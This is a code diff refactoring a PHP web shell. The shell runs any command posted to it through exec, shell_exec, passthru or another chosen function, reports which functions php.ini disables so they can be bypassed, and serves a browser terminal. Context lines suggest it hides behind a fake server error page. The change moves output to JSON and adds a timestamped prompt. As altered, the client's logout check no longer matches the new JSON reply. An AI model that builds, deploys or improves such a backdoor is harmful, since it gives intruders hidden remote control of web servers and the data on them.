@@ -20,12 +20,22 @@ class Shell{
 			'last_page_modification'=>getlastmod(),
 			'cwd'=>getcwd()
 		);
-		$this->config['prompt'] = "{$this->config['current_user']}@{$this->config['hostname']}: $";
 		if( isset($_SESSION['interpreter']) ){ $this->config['interpreter'] = $_SESSION['interpreter']; }
 		if( isset($_SESSION['cwd']) AND $_SESSION['cwd']!=$this->config['cwd'] ){
 			chdir($_SESSION['cwd']);
 			$this->config['cwd'] = getcwd();
 		}
+		$this->config['prompt'] = $this->get_prompt();
+	}
+	public function get_prompt(){
+		$prompt = sprintf(
+			'%s@%s [%s] %s :) $ ',
+			$this->config['current_user'],
+			$this->config['hostname'],
+			date('Y/m/d H:i'),
+			$this->config['cwd']
+		);
+		return $prompt;
 	}
 	public function login($username='', $password=''){
 		return ( sha1($username)==$this->config['username'] AND sha1($password)==$this->config['password'] ) ? TRUE : FALSE;
@@ -60,7 +70,10 @@ class Shell{
 		if( $this->is_ajax_request() ){
 			$interpreter = $this->config['interpreter'];
 			$command = $this->request('command');
-			$output = $this->execute($command);
+			echo json_encode(array(
+				'prompt' => $this->get_prompt(),
+				'output' => $this->execute($command)
+			));
 			exit;
 		}
 	}
@@ -70,51 +83,53 @@ class Shell{
 				$interpreter = $match[1];
 				$disabled_functions = $this->disabled_functions();
 				if( in_array($interpreter, $disabled_functions) ){
-					echo "Error. Function '{$interpreter}' is blocked by php.ini";
+					return sprintf('Error. Function "%s" is blocked by php.ini', $interpreter);
 				}else{
 					if( function_exists($interpreter) ){
 						$_SESSION['interpreter'] = $interpreter;
 						$this->config['interpreter'] = $interpreter;
-						echo "Success. Function '{$interpreter}' was set correctly.";
+						return sprintf('Success. Function "%s" was set correctly.', $interpreter);
 					}else{
-						echo "Error. Function '{$interpreter}' does not exists.";
+						return sprintf('Error. Function "%s" does not exists.', $interpreter);
 					}
 				}
 			}elseif( preg_match('/^get_interpreter$/', $command) ){
-				echo "Current interpreter set as: {$this->config['interpreter']}";
+				return sprintf('Current interpreter set as: %s', $this->config['interpreter']);
 			}elseif( preg_match('/^get_disabled_functions$/', $command) ){
 				$disabled_functions = $this->disabled_functions();
-				echo "These functions are disabled throught php.ini: ".implode(','.chr(32), $disabled_functions);
+				return sprintf('These functions are disabled throught php.ini: %s', implode(','.chr(32), $disabled_functions));
 			}elseif( preg_match('/^(get_php_version|php_version)$/', $command) ){
-				echo "PHP Version is: ".PHP_VERSION;
+				return sprintf('PHP version is: %s', PHP_VERSION);
 			}elseif( preg_match('/^cd (.*)/', $command, $match) ){
 				$_SESSION['cwd'] = realpath($match[1]);
-				echo "Changed directory to: {$_SESSION['cwd']}";
+				return sprintf('Changed directory to: %s', $_SESSION['cwd']);
 			}elseif( preg_match('/^(logout|exit)$/', $command) ){
 				$_SESSION['authenticated'] = 0;
 				session_destroy();
-				echo 'location.reload';
+				return 'location.reload';
 			}else{
-				$output = $result = NULL;
+				$output = NULL;
+				$result = NULL;
 				$interpreter = $this->config['interpreter'];
+				if( $interpreter == 'passthru' ){ $capture_buffer = TRUE; }
 				switch($interpreter){
 					case 'exec':
 						try{
-							exec($command, $output, $result);
-							foreach($output as $output_line){
-								echo "{$output_line}\n";
-							}
+							exec($command, $output_arr, $result);
+							$output = implode("\n", $output_arr);
 						}catch(Exception $e){
-							echo 'Caught exception: '.$e->getMessage();
+							$output = 'Caught exception: '.$e->getMessage();
 						}
 						break;
 					case 'shell_exec':
 					default:
 						$output = call_user_func($interpreter, $command);
-						if( $output == null ){ printf("Cannot execute this command: %s\n", $command); }
-						else if( $interpreter=='shell_exec' ){ echo $output; }
+						if( $output == null ){
+							$output = sprintf("Cannot execute this command: %s\n", $command);
+						}
 						break;
 				}
+				return $output;
 			}
 		}
 	}
@@ -172,14 +187,15 @@ error was encountered while trying to use an ErrorDocument to handle the request
 			$.ajax({
 				url: web_service,
 				type: 'POST',
-				dataType: 'html',
+				dataType: 'json',
 				data: { action:'execute', command:command },
 				cache: false,
 				success: function(data, textStatus, jqXHR){
 					if( data=='location.reload' ){
 						window.location.reload();
 					}else{
-						term.echo(data);
+						term.set_prompt(data.prompt);
+						term.echo(data.output);
 						term.resume();
 					}
 				}
@@ -187,7 +203,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 		},{
 			login: false,
 			greetings: 'You are authenticated',
-			prompt: '<?php echo $shell->config["prompt"]; ?> ',
+			prompt: '<?php echo $shell->config["prompt"]; ?>',
 			onBlur: function(){ return false; }
 		}).css({ overflow:'auto' });
 	});
